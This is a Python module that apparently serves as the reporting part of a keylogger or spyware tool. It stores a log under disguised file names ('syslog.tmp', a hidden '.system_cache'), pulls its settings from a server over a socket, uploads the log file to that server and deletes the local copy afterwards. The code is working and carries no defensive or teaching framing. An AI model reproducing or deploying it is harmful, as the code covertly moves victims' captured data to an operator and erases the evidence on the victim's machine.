import os
import socket
import platform
import json

SERVER_IP = "localhost" 
SERVER_PORT = 9999

# Default configuration 
CONFIG = {
    'send_interval': 10,
    'buffer_size': 1024,
    'retry_attempts': 3
}

# Log file location
if platform.system() == "Windows":
    log_file = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'syslog.tmp')
else:
    log_file = os.path.join(os.path.expanduser("~"), ".system_cache")

def get_config_from_server():
    """Request configuration from server"""
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((SERVER_IP, SERVER_PORT))
        
        # config request
        s.send(b'C')
        
        # Receive config
        config_data = s.recv(1024).decode('utf-8')
        s.close()
        
        # update config
        server_config = json.loads(config_data)
        CONFIG.update(server_config)
        
        print(f"Received config from server: send_interval={CONFIG['send_interval']}s")
        return True
        
    except Exception as e:
        print(f"Could not get config from server: {e}")
        print(f"  Using default: send_interval={CONFIG['send_interval']}s")
        return False

def send_logs():
    """Send log file to server and delete after successful send"""
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((SERVER_IP, SERVER_PORT))
        
        # log upload
        s.send(b'L')
        
        # Check if log file exists
        if not os.path.exists(log_file):
            print("No log file to send")
            s.close()
            return False
        
        # Send the file in chunks
        with open(log_file, "rb") as f:
            while True:
                data = f.read(CONFIG['buffer_size'])
                if not data:
                    break
                s.send(data)
        
        s.close()
        
        # Delete the log file
        try:
            os.remove(log_file)
            print("Logs sent and deleted successfully")
        except:
            print("Logs sent but could not delete file")
        
        return True
        
    except ConnectionRefusedError:
        print("Error: Could not connect to server")
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False

def get_log_file():
    """Return the log file path"""
    return log_file

def get_send_interval():
    """Return the current send interval"""
    return CONFIG['send_interval']